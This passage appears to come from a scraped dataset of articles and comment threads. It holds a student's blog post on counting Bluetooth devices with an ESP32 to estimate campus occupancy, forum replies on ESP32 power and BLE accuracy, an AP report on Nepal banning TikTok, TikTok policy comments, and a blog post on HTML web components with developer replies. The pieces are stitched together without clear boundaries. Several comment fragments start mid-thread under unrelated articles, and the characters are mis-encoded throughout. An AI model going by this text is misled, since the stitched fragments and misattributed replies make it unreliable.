    "originBody": "Building an occupancy sensor with a $5 ESP32 and a serverless DB created on 2023-10-20 Have you ever wanted to design a full end-to-end software solution to collect occupancy data across a college campus? I didn't think I would either, but here we are. The inspiration During my first year in college, we had Sodexo as our dining provider. They had a contract with Bluefox, who provides occupancy sensors to report the number of people within a dining hall. I'd like to think they used this data to improve dining hall operations. I couldn't tell you what they actually used it for. I can say that after some FOIA requests a friend made that returned PDF's with awful kerning, these devices work by counting smartphone MAC addresses from Bluetooth advertising packets. This was a pretty cool way for me to avoid crowds in the dining hall - toss the API call into Grafana, and you have a live chart of how busy the dining halls are. The downfall Unfortunately, the university switched dining hall providers to Aramark. Aramark does not contract Bluefox to provide the same occupancy counts, which meant no more occupancy data, which meant no more skipping busy hours. The climb back The idea of tracking occupancy metrics with a bluetooth beacon was stuck in my head. What design decisions and considerations would you need to make? How accurate is BLE beacon count, as a proxy for occupancy? Some people carry around headphones, smartwatches, etc - but some don't carry any devices at all (or keep Bluetooth off on their phone). How accurate is BLE beacon availability time, as a proxy for dwell time? Can we use unique MAC addresses' churn to detect this? Is the built-in MAC address randomization that is common across many different manufacturers going to impact this? (Even though this privacy feature has flaws) How can we communicate the results back to a central server? WiFi seems the obvious choice for me. Not every location will have easy-to-access WiFi, though. LoRa could be an option, depending on the distribution of beacons. Here's some range testing numbers, though this is affected by the antenna's gain and locations (here's another test with a far higher range). How can we collect the data? Should we use a time series database? How can we analyze the data? Can we predict trends in the longer time spans, excluding special events like homecoming weekend, finals week, etc? I found these questions tumbling around in my head, so I began with some preliminary testing - writing some simple code to count the number of devices detected on my laptop's Bluetooth adapter. Success - it was surprisingly easy to write code to scan for x seconds every y seconds and save it to a SQLite database at regular intervals. So, I carried my laptop to dining halls, Chick-Fil-A, Starbucks, etc and waited. And waited. And waited. I spent a lot of time collecting data while sipping on coffees and milkshakes. You know, for data collection purposes. This is all very academic, of course. No other reason. Anyway, accuracy - In smaller areas (like a single-room Starbucks), I found the count to be pretty accurate. At the very least it reflected trends in occupancy very quickly. When more people arrived, the charts quickly climbed. In larger areas like dining halls, the counts seemed accurate by my guesstimate. There's no way for me to count everyone in a dining hall, with complicated layouts and different seating areas, especially when I'm not certain of my bluetooth adapter's range (is it picking up people on the terrace through the walls? etc). But it most definitely matched the trends around class changes - when classes got out, people went to eat, which rapidly increased the number of people I saw, and the number of beacons my laptop detected. Long term deployment Okay, sounds great, it looks like we have some kind of method validation. But I don't plan on cloning myself in every dining hall and sitting 24/7, so what can we do to create a small device to collect the same data? Raspberry Pi - Maybe? My first thought was - Raspberry Pi Zero W. It's small and cheap, has Wi-Fi and Bluetooth, and definitely is in stock somewhere on Earth. I rewrote my simple code (in Rust, no less!) to handle everything gracefully (reboots, no network, adapter loss, etc). Linux Bluetooth is incredibly painful to handle in a headless way. Binding to DBus requires cross-compiler magic and not even Cross was getting me out of it. After struggling enough through a million different compiler flags, a power outage that caused me to lose my progress on the Makefile (also, yes I use Make with Rust), and at last setting up a QEMU bridge, I was able to get my binary to run on my Pi. I even wrote all of the patching magic to make it connect to Wi-Fi (try doing THAT headlessly, when there's a portal you have to sign into!), install the necessary libraries on start-up, make a service to run my executable, and automagically update when I push a new update. Okay, that's a lot of moving parts. Let's boot it up and hope it works... Nothing. That's right, absolutely nothing worked. Not even the automagic wifi connection via Mac address fiddling hacks. Moving on If you're smarter than me, you may have realized that's a bit WAY too much complexity. We really do not need a whole Linux kernel at all. We need two things - reliable Wi-Fi, and reliable Bluetooth. Okay, so shelve the Pi Zero W and Orange Pi Zero W I bought. What's this nonsense about a device that can do these two things at an even cheaper price and smaller footprint?... ESP32? On paper, it looks great - Wi-Fi, Bluetooth, extremely low power usage (üå±üåç‚ôªüåøüåûüíö), very cheap, and very tiny. I purchased one off of Amazon since I didn't want to wait for overseas shipping (not losing momentum in a nerd snipe like this is CRITICAL). I bought a random ESP32-WROOM-32 with an OLED display, since I thought it would be cool to display the data on the screen live. I rewrote my data collection code in C++ form (away from Rust!) since the Rust ecosystem for ESP32 is not all the way there yet. After fidgeting with the display code enough to get it working (SSD1306Wire display(0x3c, 5, 4); if you're wondering), it worked great. I asked campus IT to whitelist the MAC address, wrote up some Cloudflare functions into a D1 database as my data ingest, and set out to work. Deployment I hid placed my data collection device in my campus library on a crisp fall morning, sat myself down at my laptop, saw the data rolling in, and did a silent celebration. Off to my Principles class to learn about scope rules then... Why did everyone leave Swem library and never come back??? Obstacles One major problem that I ran into was the poor specs of the random ESP32 device I had. The above issue shows the device crashing at about 250 devices. At first, I was worried this was a bug with the result count being stored in a 1-byte number, like a u8 (thus capping at ~255 devices). A quick Serial.print made me realize it would crash also at about 249, 265, etc - randomly around this area. So, not a bit-overflow issue (at least, not in the integer part!). Our library fills up quickly with studious twamps - it wouldn't last a minute in finals season if it couldn't handle any more than that. The problem - identified By saving the results during a scan into a data structure until the end of the scan, it piled up data about the device's scan strength, advertised services, manufacturer ID, etc. While this seems like great data to collect, I had one thing in mind - the number of unique devices (for now). By debugging the heap size constantly, I realized that the scan results was filling up the small amount of RAM it had. This was bad news - at first, I didn't see a way to still collect the data while not actually collecting the data. Resolution I decided to brush up on my C++ data structures programming and write a small hashset. After all, the data structure for the scan results was very bloated - if I could override that, I would be able to control the heap size more closely, right? On every callback, then, we'd insert the MAC address into a hashset, then clear the built-in result structure to allow for more memory. Unfortunately, this is not ideal - if and only if there's some results to check for duplicates, the callback is only called on new devices. When we clear this every time, we give it amnesia, thus every single BLE advertisement packet causes a callback. We do check for duplicates in addToSet (it is a hashset!), but this will definitely cause hundreds of duplicate callbacks to our hashset, and heap thrashing since we're allocating and deallocating the result structure every single callback. That's okay (for now), it's better to repeatedly check a hashmap with no more than 1000 entries (a very quick procedure) very often, than have our capacity limited to 250 people. More obstacles Okay, we now have a perfect way to scan for devices for long periods of time. Oh would you look at the calendar - it's fall break! I'll leave it in the library and have it report back so I can see how packed it is over break (yes, there will be studying done on campus over break - we are a nerdy college). Perfect, even some long-term testing over the 5 day weekend! Surely nothing bad will happ- That's about 400 devices before the crash - on a fall break day in a college. As mentioned - nerdy. Okay, awesome. Another issue, one that manifests itself after 3 hours of use with zero indication of issues. After fighting with the debugger for long enough, and even tossing in periodic reboots (it boots very quick so this adds almost no time at all), I chalked this up to a bad board/BT adapter - it seemed to run, but it instantly returned zero devices on every scan. That's okay - while I was messing with this Amazon one, I bought quite a few others, along with the rest I've bought over the course of the whole project. Seeed Studio XIAO ESP32S3/C3, WaveShare ESP32S3 Zero, Unbranded ESP32-WROOM with OLED, Orange Pi Zero W (untouched), Raspberry Pi Zero W (L->R, T->D) After testing all of these, the only one reliable to work for long periods of time (one month currently) was the XIAO ESP32C3/S3. Both work acceptably, but I decided to go with the C3, since it's RISC-V, which is awesome (for my ideals), and since it's cheaper, which is also awesome (for my wallet). Another benefit of switching to a better manufacturer is more SRAM - I was able to switch away from my hand-written hashmap implementation, since the RAM was able to hold the results data structure much better without crashing. I've seen as high as 1000 devices detected with no sign of slowing down. This probably reduces CPU usage as well - no more heap and callback churn! After I found a device that worked far better, I moved my deployment location to my dorm room window so I would have an easier deployment cycle - here it is with numerous academic buildings in the background. My RISC-V based ESP32C3, scanning from my dorm room window in front of Washington Hall, during homecoming weekend. Final data collection Now that I've gotten my data collection working successfully, let's look at the data for one day. Data collection for one day. Notice the peaks? That's right about the time that classes switch. There's something to note about this. The device might be in my dorm, but it largely is not limited to the dorm's own inhabitants. Otherwise, it would be at its max in the early morning and drop as the day went on. If I wanted it to measure exclusively dorm inhabitants, I would probably place it more centrally (instead of out a window), but it still would not be great at this, since dorms are the worst at permeating bluetooth signals through many walls. That's okay, I'll just keep that in mind as I analyze the data - it's mostly picking up students as they go into the two nearest academic buildings, not the dorm inhabitants. The peaks start up around 7:50, right before the 8 am classes start in Ewell and Washington halls. I suspect this is detecting the students initially leaving dorms, shuffling along to their classes, and the drop is as students enter the buildings. Then, the peak at 8:50 is probably as students leave their 8 AMs and go to their 9 AMs, entering the range of the device only to immediately leave it as the numbers drop at 9 AM. Same for 9:50/10 AM, and 10:50/11 AM. These are all class switch times. These all point to method validation - it seems like this device really is good at tracking trends in the movement of students around it. The antenna is also seemingly very high range - I didn't expect it to reach the ~160ft into Washington Hall, and the ~100ft into Ewell. The altitude of being on the 3rd floor probably helps with it, though. Time series forecasting? This seems like the perfect target for time series forecasting, like with NeuralProphet. The data is chock-full of hourly, daily, and weekly trends. I added the functionality to predict these trends and so far, it's very good at predicting daily trends; the longer (week, month, and season-long) trends will likely converge after enough data is collected. Further thoughts Of course, this is not a solved project. I've written the code to parse this into a Cloudflare DB, into Grafana, and some forecasting, but there's more to be done. I performed an enormous amount of literature review over the course of this project - reading dozens of research papers on the topic, finding out what works and what didn't, what I would try and what I would avoid. Many questions are raised in these papers, that I still want to answer. Hours of doc review For example, how well of a proxy is a BLE beacon count for actual population count? Does this depend on the demographics? How do we find a correction factor (like for x beacons, there's roughly 0.7x people, given the multiple devices people carry around)? For example, in the computer science building, is the linear rate to population higher, since we carry so many gadgets around? Or is it lower, because we know to turn off Bluetooth when not using it (BT firmware zero days, you see)? Or in the staff building, is it lower compared to students, since they are less likely to carry around a bunch of tech? Maybe the rate is lower in a dining hall, since not many people are using multiple devices like they would in a lecture hall (laptop, iPad, etc for notes)? Other questions came to mind, like: Can we improve the accuracy by setting an RSSI minimum, for which devices weaker than it do not count, to ensure only those who are really nearby get counted? Can we improve the accuracy by filtering by manufacturer ID, so it's only Apple + common Android manufacturers? Would this help, since Apple Watches, AirPods, MacBooks, etc would all still add to the count? What kinds of privacy accomodations do I need to keep in mind? I already only track pure beacon numbers. I don't track actual MAC addresses like Bluefox did, but do I need to add noise to the data? Is the existing data noisy enough to avoid deanonymization? Is it realistic to identify a single person in the data without anything but the number of devices? What's the best scan duration? Too quick, and it won't find all of the hundreds of devices that exist. Too long, and we risk inaccuracy (counting devices that have since left, data showing large drifts within short periods of time, etc). Is a dynamic scan length best? (Think about cooking a bag of popcorn - when a period of time passes without any change, you're done) Lots of questions to answer. I plan on validating my data with real-world population data collected in a place where it's easy to get the \"ground truth\". Maybe I will reach out to a place on campus who either already tracks occupancy (the gym with swipe in/out), or will investigate more thoroughly in a place where it is trivial to do so myself (limited entry/exit, like a dining hall, or a Starbucks). Further work I am not sure whether I will be taking this further - I'm currently talking to some professors about the use cases for some university committees, or perhaps further academic (and hopefully publish-worthy) research. I am also considering selling it to brick-and-mortar businesses that want to measure occupancy trends. It's a pretty packaged up solution - everything from the front-end to the back-end is built already. This is vaguely what the setup looks like for any given deployment: Set up Wi-Fi in config (either have network whitelist the MAC if it's a portal, or connect to open/password protected Wi-Fi on boot) Change machine and site IDs in config Plug device/devices into outlet in central/convenient locations Set up Grafana dashboard to read each device from backend Set up Grafana dashboard to read predicted trends as well, in separate charts If you're interested in any of this, please let me know! I'd love to hear from you. Conclusion I hope you enjoyed reading my blog post about analyzing occupancy trends and embedded development.

We actually built a business based on this technology (occuspace.io) and have had to address almost all the questions that you brought up. To answer some of them here:Q: How accurate is BLE beacon count, as a proxy for occupancy?A: It&#x27;s very highly correlated but different dining locations, classrooms and library floors have very different correlation factors. Consider using other, perhaps more complex features, as well.Q: How accurate is BLE beacon availability time, as a proxy for dwell time?A: We don&#x27;t believe it is very accurate given that BT MAC&#x27;s randomize every 8-20 mins depending on manufacturer.Q: Can we improve the accuracy by setting an RSSI minimum, for which devices weaker than it do not count, to ensure only those who are really nearby get counted?A: That&#x27;s a great idea. It&#x27;s worth noting that different types of spaces and depending on where you installed your sensor, will have different threshold levels. reply georgeashworth 6 hours agoparentDoes this type of occupancy tracking work accurately outdoors? I&#x27;m assuming it would be difficult because signals would travel further. (My startup needs occupancy tracking for tennis courts.)Maybe I could mount a BT device at a corner of the outdoor space and use its signal strength as the threshold value. reply rsaxvc 5 hours agorootparentIf you want to get really spicy, you can use two antennas and an SDR to compute angle of arrival using nothing but a BLE advertisement&#x27;s data . This is different from BLE AoA as it doesn&#x27;t require a cooperative transmitter. reply alias_neo 2 hours agorootparentIf you want to get really, really spicy, use three devices&#x2F;antennas and you can roughly track in three-dimensional space. reply sgu999 1 hour agorootparentprevDid you consider using BT or UWB as a radar?

For the ESP32&#x27;s specifically I highly recommend adding a beefy capacitor over the power rails, as those can be rather sensitive to voltage fluctuations especially when transmitting. Both the RPi and ESP&#x27;s can be finicky depending on the power supply&#x2F;cable&#x2F;cable length too, and the RPi&#x27;s sdcard does tend to fail from sudden power loss. They should all be capable of at least a month, my pi&#x27;s and esp&#x27;s have gone several months.I&#x27;d be curious to see the results from other ESP32&#x27;s (or even the pi) with a larger capacitor added. reply sodality2 15 hours agoparentIt‚Äôs definitely not a reliability issue, with the platform - ESP32 in general is very popular so it‚Äôs surely an issue with my usage. I‚Äôm fairly certain it‚Äôs just a cheap manufacturer issue I ran into. I bought essentially a no-name ESP32 at first and that‚Äôs the one that refused to last. Proper manufacturer solved that issue for me and now ESP32 works just fine.The raspberry pi actually never worked, largely because I tried to shoehorn way too much complexity in and manage too many things. It‚Äôs just a BT scan and a HTTP call.I don‚Äôt think it‚Äôs a power issue as it‚Äôs getting 5V1A from a power outlet directly to USB-C into the device. Though that‚Äôs definitely something I need to look into, as the Xiao ESP32-S3 I have also had intermittent issues, and IIRC the XTensa cores are more power-hungry than its RISC-V based sibling, the ESP32-C3. reply filterfiber 15 hours agorootparent> I don‚Äôt think it‚Äôs a power issue as it‚Äôs getting 5V1A from a power outlet directly to USB-C into the device.It&#x27;s not the total voltage&#x2F;wattage the PSU can provide, but the voltage at the processor.The ESP&#x27;s varying current draw notoriously causes too much noise and a lot of boards don&#x27;t have large enough decoupling capacitors so the voltage drops too much and it glitches out. Also a warning that USB PSU&#x27;s can very MASSIVELY in quality (I&#x27;d suggest an apple one for testing if you have one handy).I think you&#x27;re right that the RISC-V processor is either better behaved and draws power more consistently, or the board has shorter traces to it&#x27;s bypass capacitor or a larger bypass capacitor. reply stavros 9 hours agorootparentThis is correct, I thought it wasn&#x27;t and was going crazy trying to debug my Pi 3 resetting my 3D printer every time, with any of ten power supplies I tried, including a configurable bench PSU.I switched to the official Pi PSU after someone said \"trust me on this\" online, and yep, zero issues in all the years since. reply numpad0 37 minutes agorootparentIt&#x27;s voltage for Pi 3.

ESP32 is designed to be easy to put into your own products, this means design a circuit board and case to fit each other, and so on. Then you buy the ESP32 chips in bulk and assemble them onto the circuit board.

The perma-proto is screwed into posts in the case (as are several daughterboards). The user-controlled potentiometer is also soldered into the perma-proto and is tightly screwed into the case. There&#x27;s a power jack screwed into the case, and all wiring in&#x2F;out of the case goes through a \"cable gland\" and the cables, outside the case, and wrapped into nylon sleeve with strain relief.

The big issue is taping it out to a chip FAB, around $25K, see my comment below.I would get started with an off the shelf MCU with good documentation, writing the software on a good development platform with the same assembly as the final microcontroller. For the $0,04 ARM microcontroller I mentioned above as final target with analog to digital controller (ADC) I would first write the program (the main loop) on a Mac on a high level language like Squeak or Python and use the $4 raspberry pi pico as ADC. I would then rewrite the working software in ARM assembly and test it directly on the pi pico. Then I would flash it on the $0.04 arm microcontroller wired on a breadboard to the moisture sensor. Then I would debug it again, with simple flashing leds to see where your software goes wrong. morphle at ziggo dot nl for more questions like how to find a 4 cent arm chip.

How far apart are the trees?Other than that, I would suggest testing out lots of different hardware. I bought several different boards before any decisions were made, and I‚Äôm glad I didn‚Äôt stick to just one. Costed me maybe $30 to buy a gamut of devices and now I‚Äôve settled on a single one that does what I need.Also, make sure you‚Äôre flashing with the largest image size you can, if your code becomes too large. For me I had to enable an option in the board settings to use the full memory space.Lastly, one thing you should do is the low power option. See which board supports it the best. Then, what I would do at startup is turn on all the sensors, collect and send data right away, then turn all your sensors off. Do ultra deep sleep for 6 hours. then when it wakes up, don‚Äôt bother doing any kind of loop to the beginning - hard reboot. That avoids any problems with memory allocation becoming too large somehow over the course of the program, since it always starts fresh (which is all you need!).

A systemd process that would ensure the script would get re-run if the process crashed or machine rebooted3. A separate script that parsed the logs and pushed them to a local sqlite DB that tracked the minute the bluetooth id was found.4. A daily push to my backup server that stored the sqlite DBI decided to use systemd and a simple(10loc) bash script since I faced a similar issue to the OP where my pi would crash(although it was purely my fault for messing with a bunch of cables) and I wanted a way to get it running again with the lowest overhead. I also wanted as few dependencies as possible.I went with SQLite because it made querying for trends and building dashboards simpler and more interesting(and because the real project was the sqlite interface I was building :) )One thing I learned from running this which also may answer a couple of OPs questions: Apple devices like hiding themselves. The only way I could get my Apple laptops and phones to show up was to keep the bluetooth settings menu open on them. Otherwise, they wouldn&#x27;t appear to the bluetooth scanner.

The European Union ratcheted up its scrutiny of Big Tech companies on Thursday, Oct. 19, 2023, with demands for Meta and TikTok to detail their efforts on curbing illegal content and disinformation amid the Israel-Hamas war. (AP Photo/Kiichiro Sato, File) Read More Updated 3:53 PM UTC, November 13, 2023 Share Share Copy Link copied Email Facebook X Reddit LinkedIn Pinterest Flipboard Print KATHMANDU, Nepal (AP) ‚Äî Nepal‚Äôs government decided to ban the popular social media app TikTok on Monday, saying it was disrupting ‚Äúsocial harmony‚Äù in the country. The announcement was made following a Cabinet meeting. Foreign Minister Narayan Prakash Saud said the app would be banned immediately. ‚ÄúThe government has decided to ban TikTok as it was necessary to regulate the use of the social media platform that was disrupting social harmony, goodwill and flow of indecent materials,‚Äù Saud said. He said that to make social media platforms accountable, the government has asked the companies to register and open a liaison office in Nepal, pay taxes and abide by the country‚Äôs laws and regulations. It wasn‚Äôt clear what triggered the ban or if TikTok had refused to comply with Nepal‚Äôs requests. The company did not immediately respond to an email seeking comment. TikTok, owned by China‚Äôs ByteDance, has faced scrutiny in a number of countries because of concerns that Beijing could use the app to harvest user data or advance its interests. Countries including the United States, Britain and New Zealand have banned the app on government phones despite TikTok repeatedly denying that it has ever shared data with the Chinese government and would not do so if asked. Nepal has banned all pornographic sites in 2018.",

The second is a ranking of \"hot topics\", where Xi Jinping gets a dedicated top spot above number 1. Obviously that&#x27;s because he&#x27;d only rarely rank near the top organically.

Everyone&#x27;s libertarian until they see a real harm that actually upsets them and they can&#x27;t victim-blame. reply jampekka 1 hour agorootparentprevMaybe some way of making addiction-inducing products less profitable instead of censorship? Or going further, lessening the role of profit in how society is organized? reply zo1 43 minutes agorootparentprevI&#x27;m also heavily leaning towards Libertarian&#x2F;Anarcho-Capitalist. My thought on the matter is that whatever solution we come up with to resolve this particular issue is the same one we need to do to resolve the greater societal issues we are seeing, because I think the root cause is the same.Beyond that, part of the Libertarian line of thought is that we have to \"let go\" and let things fall where they may because we have no moral claim over it. The area of effect we have as individuals is quite small so it makes sense to focus in that direction rather. So that would mean things like family, neighborhood, community, shared culture&#x2F;religion, and the institutions that build on those.I myself try to be involved with and sit on the boards of HoAs, to add some sanity and fairness to it.

Because we can&#x27;t just force them to buy opium at gunpoint any more. reply jowea 13 minutes agoparentprevGood question now that I think about it. I guess because it was not a real issue until now because there was no Chinese app popular outside its borders? And the whole app&#x2F;internet economy is still somewhat new compared to the speed at which international trade law gets written I guess, so there are no established rules. The EU has just started enforcing their opinion on it with some recent laws, and the US started doing something about TikTok under Trump. reply TotoHorner 20 minutes agoparentprevThe user-base on TikTok (in the US at least) leans extremely left (because they&#x27;re all young) so the news media has idiotically made this a left vs. right issue.Yes, any neutral observer can see that it&#x27;s incredibly foolish to let a company with strong connections to our largest geopolitical rival have control over 1-2 hours of attention (every day) of young people in the US.We literally have no idea if TikTok is boosting certain political&#x2F;social values amongst American youth. Even a slight nudge could have a huge effects (because of the scale at which TikTok operates) and it would be impossible to detect.The idea that there&#x27;s some \"iron wall\" between US and Chinese data has already been proven false.

But I have consistently swiped away anything I don&#x27;t want to see more of as soon as I can.If anything, the problem for me now is that TikTok is so narrow in what it shows me that I barely ever get anything new (thematically) and when I do TikTok instantly tries to make it its entire focus if I dare engage with it at all. reply aembleton 2 hours agoparentprevWhat&#x27;s thot? reply graftak 2 hours agorootparentPeople promoting their onlyfans content with suggestive videos. reply consp 2 hours agorootparentprevhttps:&#x2F;&#x2F;knowyourmeme.com&#x2F;memes&#x2F;thot should give you some insight. reply Biganon 2 hours agorootparentprevAn ancient Egyptian deity, and (unrelatedly) a misogynistic term to describe a woman who has the audacity to be sexually active reply hyperdunc 1 hour agorootparentNo, it&#x27;s a woman who uses her sexual allure to attract and extract money from lonely boys. reply 6stringmerc 3 hours agoparentprevSee I totally get your technique and report on this and thank you.

Fines are not the price a government is willing to sell something for. They are a mechanism of enforcement when it&#x27;s otherwise not realistic or possible to enforce rules. You levy fines when you can&#x27;t just arrest people or similar, not because you&#x27;re okay with the behavior.All you&#x27;re saying is that we should tax things we don&#x27;t like, which... duh. We do that- see alcohol, cigarettes, etc. Actual taxes work way better than fines, since they take into account the revenue involved instead of just being an arbitrary number. But an obvious consequence is that you aren&#x27;t actually banning the thing, and in the case of a digital product like tiktok you&#x27;re not even discouraging it.If you levied a recurring fine on tiktok in return for allowing them to do what they want, you&#x27;re actively encouraging them to collect and sell as much data as they possibly can, to recoup the fixed cost of doing business with you. reply vasdae 8 hours agoparentprev>Win for regulators, Win for usersThat&#x27;s assuming that citizens want censorship.

    "title": "Web Components vs React: Prioritizing Enhancement over Replacement",
    "originLink": "https://blog.jim-nielsen.com/2023/html-web-components/",
    "originBody": "HTML Web Components 2023-11-13 I think the word ‚Äúcomponent‚Äù in ‚Äúweb components‚Äù confused a lot of people ‚Äî at least it did me. ‚ÄúWeb components‚Äù sounded like the web platform‚Äôs equivalent to ‚ÄúReact components‚Äù. JSX hadand now the web had . But when you try building web components the same way you build React components, it‚Äôs easy to get frustrated and give up because web components don‚Äôt work like React components ‚Äî I know I gave up a few times. The grain of a React component is not the grain of a web component. Their design prioritize different functionality and forms of use. If you try to use one like the other, you‚Äôll fight the direction of their natural grain. Web components have their own grain and it favors enhancement over replacement. What do I mean by this? A typical React component might look like this[1]:You could write a web component this same way, e.g.But the unique power of web components (in the browser) is that they can render before JavaScript. React components cannot do this ‚Äî full stop. This feature of web components encourages a design of composability. Rather than an empty ‚Äúshell component‚Äù that takes data and (using JavaScript exclusively) renders the entirety of its contents, web components encourage an approach of composing core content with HTML and then wrapping it in a custom element that enhances its contents with additional functionality.This specific flavor of componentization is what Jeremy calls ‚ÄúHTML web components‚Äù: If your custom element is empty, it‚Äôs not an HTML web component. But if you‚Äôre using a custom element to extend existing markup, that‚Äôs an HTML web component. React encouraged a mindset of replacement: ‚Äúforgot what browsers can do; do everything in a React component instead, even if you‚Äôre reinventing the wheel.‚Äù HTML web components encourage a mindset of augmentation instead. I like that term ‚ÄúHTML web component‚Äù. It stands in contrast to a ‚ÄúJavaScript web components‚Äù which would be an empty element whose functionality and contents rely exclusively on JavaScript. Per my earlier example, this would be a JavaScript web component:It relies exclusively on the presence of JavaScript and is meaningless to the end user without it. Whereas this would be an HTML web component:It has meaning and content without JavaScript ‚Äî then is enhanced by its presence. This idea of augmentation/enhancement over replacement is intriguing. On The Web, Augmentation Wins in the Long Run Augmentative approaches work best on the web because 1) the web‚Äôs grain encourages enhancement to improve resilience, and 2) that‚Äôs really the best way to iteratively change something as big as the web. Eventually all the best ideas of web-adjacent frameworks are subsumed into the platform to work in ways that augment the existing technology rather than replace it wholesale. XHTML wanted to replace HTML4, but HTML5 wanted to augment it. HTML5 won. Networking libraries wanted to replace XMLHttpRequest and their best ideas were eventually ported into the fetch standard ‚Äî which exists in more places than just the browser these days! The best ideas of Sass and jQuery were ported to the browser. Typescript‚Äôs best ideas are going to the browser, but in a way that works to enhance not replace what exists. With web components, you might even say React‚Äôs component model is being ported to the browser. But it‚Äôs being done in a way that works to enhance how the web already works, not replace it. My takeaway is: if you‚Äôre looking for longevity, opt for a technical approach of augmentation and enhancement over replacement. The web‚Äôs grain is arranged in that direction. I think React is trending towards becoming more like HTML over the years. Dan Abramov notes how component composition over prop drilling is a ‚Äútop react skill to learn in 2023‚Äù. Even the react docs specifically call out the composability of HTML and how you might want to follow HTML‚Äôs example in your JSX. ‚Ü© Reply via: Email, Twitter, Mastodon",

Does it just have styles in it? If so why wouldn&#x27;t I just use css classes?I also think having a `user-avatar` take a `src` prop makes way more sense than having to add an `img` tag inside it everywhere I use it. In that case what am I saving? What is reusable?Vue&#x2F;React&#x2F;Angular don&#x27;t seem like they are trying to \"replace\" HTML (re: \"XHTML wanted to replace HTML4, but HTML5 wanted to augment it. HTML5 won.\", in the \"On The Web, Augmentation Wins in the Long Run\" section), they are taking HTML&#x2F;CSS&#x2F;JS and building on top of them. If they all used canvas to render instead I might buy that argument but they don&#x27;t. They absolutely push those technologies to their breaking point but it&#x27;s nothing short of amazing in my book what you can accomplish with them compared to just HTML&#x2F;CSS&#x2F;JS and even \"web components\".I was excited when Web Components were first announced but they are incredibly lackluster with no \"Batteries included\" and feel like they don&#x27;t really help you build web _apps_ like the frameworks do.

The thing is there are just vanishingly few places where you only need a \"sparkling of interactivity on top\". Yes your blog probably doesn&#x27;t need a full framework, nor does your news site (which is just a blog++) or your marketing web page. But so many other things really do or things break down quickly. Also what your web site needs today might not cover what it needs tomorrow. I&#x27;ve seen a number of \"web admin\"&#x2F;backend control panels (customer-facing for config) start simple then grow until they start to collapse under their own weight with just added jQuery as needed. Sure, at the start, htmlx&#x2F;jQuery might cover all you need but soon you are building custom UI to represent business logic&#x2F;ideas and managing with that gets very unwieldy. The people that say \"all you need is the built-in HTML elements\" are living in a fantasy land, try using the default date&#x2F;time picker and get back to me.I&#x27;m sure there are things I&#x27;d agree with the anti-react crowd on (places you don&#x27;t need a framework) but all their examples are incredibly contrived and feel like the \"TODO app examples\" you often see for frameworks or learning a language. They don&#x27;t even scratch the surface of what&#x27;s needed for complicated apps, they are great to show off the simple things but it seems like the anti-react&#x2F;anti-framework crowd thinks those simple examples are all you need and that&#x27;s just silly.At the end of the day I&#x27;ll admit I reach for a framework earlier than I absolutely need it and that&#x27;s because I&#x27;ve built 10&#x27;s and 10&#x27;s of sites (web apps) from the ground up and eventually you either use a framework or you end up creating a shitty version of one. So yeah, day 1 I might not need Vue but day 100 I&#x27;m sure glad I have all of Vue to build on. reply Xeamek 13 hours agorootparentWould this example be considered \"trivial\"? https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=3GObi93tjZIBut also, you can mix things togheter. You can just use react based app &#x27;embeded&#x27; into mpa for when you need that heavy lifting, and the same keep the content part of your app simple.\"But why would i do that, if i&#x27;d already use react for some parts, why not every where\".Becuase then it leads to abominations like reddit or facebook, where websites that are basically glorified text forums will use gigabytes of memory, have terrible UX, be slow and will crash your browser if you leave them open for too long. reply phist_mcgee 6 hours agorootparentCool what Contexte did with HTMX, but personally I really dislike the amount of data packed into those HTML templates, those hx-get attributes are frighteningly long. reply jiggawatts 13 hours agorootparentprevAs a counterpoint: I consult for government agencies that have all separately decided to standardise on Angular.They mostly publish static content: alerts, updates, reports, etc‚Ä¶At most they might have a single page somewhere for submitting a payment or a simple form.But because of this JS framework by default policy all their apps end up with extra complexity, extra build steps, and an awful amount of dependency maintenance.Most of their sites could have been static HTML files on disk. reply joshstrange 13 hours agorootparentThat&#x27;s understandable. Though I actually can see some logic in it. It&#x27;s got to be way easier to hire Angular developers than it is to hire someone who wants to eek out the maximum performance with this lightest-weight approach (and do it in a maintainable&#x2F;understandable way).I&#x27;ll never say Vue&#x2F;React&#x2F;Angular are \"light\" and I&#x27;ll fully admit we give up some performance for DX (and UX) but it&#x27;s a tradeoff I think is worth it (I understand if you don&#x27;t agree).In the same vein, I know cross-platform frameworks like Ionic&#x2F;Quasar are nowhere near as good as native apps. That said the skill set you need (and dedication to actually embracing the platform idiosyncrasies) to make _good_ native apps is not cheap or easy. Cross-platform apps might not fit in as well and might be heavier but they allow fewer people to do more with less. Heck, I have a side-business that relies _heavily_ on apps and it would not exist if I couldn&#x27;t write them in HTML&#x2F;JS&#x2F;CSS as much as that makes some people&#x27;s stomachs turn. reply flukus 10 hours agorootparent> It&#x27;s got to be way easier to hire Angular developers than it is to hire someone who wants to eek out the maximum performance with this lightest-weight approach.I disagree, at least around here. Frontend developers with react&#x2F;angular experience are a hot commodity and really hard to hire, yet just about anyone from any tech tech can knock out html and some minimal css. reply toasted-subs 13 hours agorootparentprevKind of obvious why, any of the react based frameworks all fail an audit.Doesn&#x27;t even make sense to me why anybody uses them.You cant audit static sites (ones thing I don&#x27;t like about having traditional linked libraries). reply azemetre 10 hours agorootparentWhat makes certain libraries auditable? I doubt react was compliant when first came out.Why can‚Äôt you audit a static site? Seems very straight forward. We already audit static sites for accessibility (503 compliance).Any resources you can point to? Seems like it would be a worthy effort to make other tools compliant.Definitely something I want to learn about. reply tbossanova 11 hours agorootparentprevWhat kind of audit are you talking about? reply presentation 8 hours agorootparentprevProbably since 99% of websites don‚Äôt need to pass an ‚Äúaudit‚Äù, whatever that means reply whatshisface 13 hours agorootparentprevI think the future of webdev is a framework-like system that can be added gradually to basic HTML, rather than one which requires that you totally replace it with JSX, etc. from the start. Webcomponents are a huge step towards a time when we can add state managers and things like that without bringing in a monolith all at once.Some projects require 1% of a framework, others require 98%, but the majority are in a range between 25% and 75% which currently need you to re-architect for a total perfusion of React or a competitor. reply zztop44 11 hours agorootparentSvelte is pretty close to this (at the expense of a build step). It gives you (in my opinion) better ergonomics that React, has no runtime and outputs sites that don‚Äôt require JS unless they do.Sveltekit (its official fullstack framework) even encourages building apps that fall back gracefully for users with JS disabled.Of course, none of that is to say that you can‚Äôt build bloated, badly performing apps in Svelte. Just that you *can* have the best of both worlds, even for simple&#x2F;static sites. reply joshstrange 13 hours agorootparentprevAnd I&#x27;ll happily use such a system once it exists but Vue&#x2F;React&#x2F;Angular exist today and have allowed a level of productivity, DX, and UX unheard of with what browsers provide by default. If browsers want to compete then be by guest but FF seems to busy doing next to nothing, Chrome 